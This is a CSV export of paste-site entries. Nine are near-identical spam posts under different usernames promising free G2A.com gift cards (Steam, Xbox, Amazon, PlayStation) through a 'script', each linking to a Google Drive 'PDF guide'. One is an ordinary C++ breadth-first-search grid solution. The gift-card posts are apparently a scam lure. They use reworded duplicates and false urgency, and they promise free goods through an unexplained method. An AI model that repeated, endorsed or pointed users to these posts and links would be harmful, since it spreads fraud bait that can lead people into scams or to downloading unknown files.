id,title,username,language,date,content
D1RiYEMc,🤑G2A.com Free Gift Card FIX July 2024🤑,Axel_Jax,JavaScript,Friday 28th of June 2024 01:04:40 PM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Xbox gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
2ySa7bfW,🤑G2A.com Free Gift Card FIX July 2024🤑,FunkyMonkey22,JavaScript,Friday 28th of June 2024 12:58:33 PM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
wNVaD3Qy,🤑G2A.com Free Gift Card FIX July 2024🎁,Darkew,JavaScript,Friday 28th of June 2024 12:52:29 PM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
WWVcBD5g,🤑G2A.com Free Gift Card FIX July 2024🎁,angeloee,JavaScript,Friday 28th of June 2024 12:46:27 PM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
KECtxKuY,🤑G2A.com Free Gift Card FIX July 2024🤑,jcxeq,JavaScript,Friday 28th of June 2024 12:40:21 PM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
42BpmE4c,Untitled,Ahmed_Negm,C++,Friday 28th of June 2024 12:40:12 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    int n,m; cin>>n>>m;

    vector<vector<int>> grid(n, vector<int>(m));
    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            char c; cin>>c;
            if(c=='#') grid[i][j] = 0;
            else if(c=='P') grid[i][j] = -1;
            else if(c=='.') grid[i][j] = 1;
            else grid[i][j] = c-'0';
        }
    }

    queue<pair<int,int>> q;
    // map<pair<int,int>,bool> vis;
    // set<pair<int,int>> vis;
    bool vis[n][m] = {false};

    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            if(grid[i][j]==-1){
                q.push({i,j});
                vis[i][j] = true;
            }
        }
    }

    while(!q.empty()){
        int x = q.front().first, y = q.front().second;
        q.pop();

        int nx = x,ny = y;
        if(grid[x][y] == -1) ny = y+1;
        else ny = y+grid[x][y];
        if(ny<m){
            if(grid[nx][ny]>0 && !vis[nx][ny]){
                vis[nx][ny] = true;
                q.push({nx,ny});
            }
            nx = x+(grid[x][y]==-1?1:grid[x][y]);
            if(nx<n and grid[nx][ny]>0 and !vis[nx][ny]){
                vis[nx][ny] = true;
                q.push({nx,ny});
            }
            nx = x-(grid[x][y]==-1?1:grid[x][y]);
            if(nx>=0 and grid[nx][ny]>0 and !vis[nx][ny]){
                vis[nx][ny] = true;
                q.push({nx,ny});
            }
        }
    }

    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            if(vis[i][j]) grid[i][j] = -1;
            vis[i][j] = false;
        }
    }

    for(int i=0;i<n;i++){
        if(grid[i][0]>0){
            q.push({i,0});
            vis[i][0] = true;
        }
    }

    int ans = 0;
    while(!q.empty()){
        int sz = q.size();
        while(sz--){
            int x = q.front().first, y = q.front().second;
            q.pop();

            if(y==m-1){
                cout<<ans<<nl;
                return;
            }
            int nx = x,ny = y+grid[x][y];
            if(ny<m){
                if(grid[nx][ny]>0 and !vis[nx][ny]){
                    vis[nx][ny] = true;
                    q.push({nx,ny});
                }
                nx = x+grid[x][y];
                if(nx<n and grid[nx][ny]>0 and !vis[nx][ny]){
                    vis[nx][ny] = true;
                    q.push({nx,ny});
                }
                nx = x-grid[x][y];
                if(nx>=0 and grid[nx][ny]>0 and !vis[nx][ny]){
                    vis[nx][ny] = true;
                    q.push({nx,ny});
                }
            }
        }
        ans++;
    }

    cout<<-1<<nl;


}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
byF97HKx,🤑G2A.com Free Gift Card FIX July 2024🤑,PAUL-A8,JavaScript,Friday 28th of June 2024 12:34:01 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
LZ1MnfUJ,🎁 G2A.COM FREE GIFT CARD GUIDE JULY 2024 V3🎁,wwxcwx,GetText,Friday 28th of June 2024 12:28:10 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
28 June > 03 July 2024"
BMVJrJM5,🤑G2A.com Free Gift Card FIX July 2024🤑,Kevin_Chen1,JavaScript,Friday 28th of June 2024 12:27:58 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
mvsC2jun,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V3 🎁,BitcoinScript2020,GetText,Friday 28th of June 2024 12:22:51 PM CDT,"G2A.com free gift card & games updated guide,
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
28 June 2024"
